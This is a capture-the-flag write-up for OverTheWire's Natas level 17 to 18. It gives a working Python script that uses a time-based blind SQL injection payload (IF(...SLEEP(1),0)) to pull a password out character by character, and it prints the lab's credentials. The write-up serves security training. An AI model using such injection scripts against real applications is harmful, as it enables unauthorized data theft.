# Natas Level 17 to 18

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 17 -> 18 |
| Status | Complete |

## Objective

Extract the next password using time-based blind SQL injection.

## Given Access

User: `natas17`

Password:

```text
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

## Method

The page suppresses the previous visible `user exists` output, but the SQL injection remains. Use `IF(..., SLEEP(1), 0)` and measure response time. A true predicate delays the response.

## Commands

```python
import requests, string, time

url = "http://natas17.natas.labs.overthewire.org/"
auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
chars = string.ascii_letters + string.digits
password = ""

for pos in range(1, 33):
    for ch in chars:
        inj = f'natas18" AND IF(BINARY SUBSTRING(password,{pos},1)="{ch}", SLEEP(1), 0) #'
        start = time.monotonic()
        requests.get(url, auth=auth, params={"username": inj}, timeout=5)
        if time.monotonic() - start > 0.75:
            password += ch
            print(password)
            break
```

## Result

Password for `natas18`:

```text
6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```

## Lesson

When content-based output is removed, timing can still reveal boolean query results. Longer sleep values are more reliable, but slower.

## References

- https://overthewire.org/wargames/natas/
